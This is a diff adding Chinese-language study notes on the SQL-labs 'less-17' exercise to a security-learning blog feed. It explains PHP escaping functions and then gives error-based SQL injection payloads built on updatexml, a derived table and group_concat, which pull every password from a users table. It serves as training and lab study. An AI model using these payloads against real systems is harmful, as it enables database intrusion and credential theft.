@@ -503,6 +503,57 @@ eval函数，这是执行函数；这里执行了_变量中的内容也就是&#3
 <h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p><a href="https://blog.csdn.net/zy15667076526/article/details/109705286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165390231016781818750292%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165390231016781818750292&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-109705286-null-null.142%5Ev11%5Epc_search_result_control_group,157%5Ev12%5Econtrol&utm_term=dvwa&spm=1018.2226.3001.4187">推荐文章链接</a></p>
 <p><em><u>不要只知道payload，要仔细分析理解源码，找出出现漏洞的原因点</u></em></p>
 <h1 id="SQL-labs"><a href="#SQL-labs" class="headerlink" title="SQL-labs"></a>SQL-labs</h1><p><em><u>这里不全写，详细建议找一下sql-labs天书，认真学习一下</u></em></p>
+<h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>其实我们可以先在源代码中看到一个函数。check_input()函数。 就会了解为什么不在username处进行注入</p>
+<p><img src="/2022/06/21/underline-learning/Users\荒天帝\AppData\Roaming\Typora\typora-user-images\image-20220711110201628.png" alt="image-20220711110201628"></p>
+<p>这里把这几个函数解释一下，就清楚了</p>
+<p><strong>★addslashes()</strong></p>
+<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 </p>
+<p>预定义字符是： </p>
+<p>​           <strong>·</strong>单引号（’） </p>
+<p>​          <strong>·</strong>双引号（”） </p>
+<p>​         <strong>·</strong>反斜杠（\） </p>
+<p>​         <strong>·</strong>NULL </p>
+<p>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。 </p>
+<p>注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您 </p>
+<p>不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可 </p>
+<p>以使用函数 get_magic_quotes_gpc() 进行检测。 </p>
+<p>语法：addslashes(string) </p>
+<p>参数                    描述</p>
+<p>string                 必需。规定要转义的字符串。 </p>
+<p>返回值：           返回已转义的字符串。 </p>
+<p>PHP 版本：       4+ </p>
+<p><strong>★stripslashes()</strong> </p>
+<p>函数删除由 addslashes() 函数添加的反斜杠。 </p>
+<p><strong>★mysql_real_escape_string()</strong></p>
+<p>函数转义 SQL 语句中使用的字符串中的特殊字符。 </p>
+<p>下列字符受影响： </p>
+<p>​      <strong>·</strong>\x00 </p>
+<p>​      <strong>·</strong>\n </p>
+<p>​      <strong>·</strong>\r </p>
+<p>​      <strong>·</strong> \ </p>
+<p>​      <strong>·</strong>‘ </p>
+<p>​      <strong>·</strong>“ </p>
+<p>​      <strong>·</strong>\x1a </p>
+<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。 </p>
+<p>语法：mysql_real_escape_string(string,connection) </p>
+<p>参数                              描述 </p>
+<p>string                            必需。规定要转义的字符串。 </p>
+<p>connection 可选。    规定 MySQL 连接。如果未规定，则使用上一个连接</p>
+<hr>
+<p>开始先尝试注入，发现没有回显，所以试试报错注入</p>
+<p><code>1&#39;and updatexml(1,concat(0x7e,(select password from users),0x7e),1)#</code></p>
+<p><img src="/2022/06/21/underline-learning/Users\荒天帝\AppData\Roaming\Typora\typora-user-images\image-20220711113122500.png" alt="image-20220711113122500"></p>
+<p>报出<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code></p>
+<p><u>大致意思是，在同一语句中，不能先select出同一表中的某些值，再update这个表</u></p>
+<p>所以这里就需要加一个中间表，就可以绕过这个错误</p>
+<p>比如</p>
+<p><code>1&#39;and updatexml(1,concat(0x7e,(select password from (select password from users)a),0x7e),1)#</code></p>
+<p>这里就是把<code>(select password from users)</code>的查询后的数据存入生成的新表a，然后就相当于<code>(select password from a)</code></p>
+<p><img src="/2022/06/21/underline-learning/Users\荒天帝\AppData\Roaming\Typora\typora-user-images\image-20220711114340188.png" alt="image-20220711114340188"></p>
+<p>发现不能超过一行</p>
+<p><code>1&#39;and updatexml(1,concat(0x7e,(select group_concat(password) from (select password from users)a),0x7e),1)#</code></p>
+<p><img src="/2022/06/21/underline-learning/Users\荒天帝\AppData\Roaming\Typora\typora-user-images\image-20220711114654089.png" alt="image-20220711114654089"></p>
+<p>成功</p>
 ]]></content>
       <categories>
         <category>网络安全学习</category>
